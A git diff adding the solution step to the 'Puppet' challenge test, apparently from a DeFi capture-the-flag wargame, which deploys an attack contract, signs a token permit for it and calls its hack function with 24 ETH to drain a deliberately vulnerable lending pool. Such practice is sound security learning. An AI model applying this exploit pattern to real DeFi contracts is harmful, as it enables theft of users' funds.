@@ -95,6 +95,36 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      const hack = await (await ethers.getContractFactory('PuppetPoolHack', deployer)).deploy(
+          lendingPool.address, uniswapExchange.address
+      );
+
+      const domain = {
+        name: 'DamnValuableToken', version: '1',
+        chainId: player.provider._network.chainId, verifyingContract: token.address
+      };
+
+      const types = {
+        Permit: [
+          { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, 
+          { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' },
+          { name: 'deadline', type: 'uint256' },
+        ],
+      };
+
+      const nonce = await token.nonces(player.address);
+      const value = {
+        owner: player.address, spender: hack.address,
+        value: PLAYER_INITIAL_TOKEN_BALANCE, nonce,
+        deadline: ethers.constants.MaxUint256,
+      };
+      const signature = await player._signTypedData(domain, types, value);
+      const {v, r, s} = ethers.utils.splitSignature(signature);
+
+      await hack.connect(player).hack(
+        PLAYER_INITIAL_TOKEN_BALANCE, ethers.constants.MaxUint256,
+        v, r, s, { value: 24n * 10n ** 18n }
+      );
     });
 
     after(async function () {
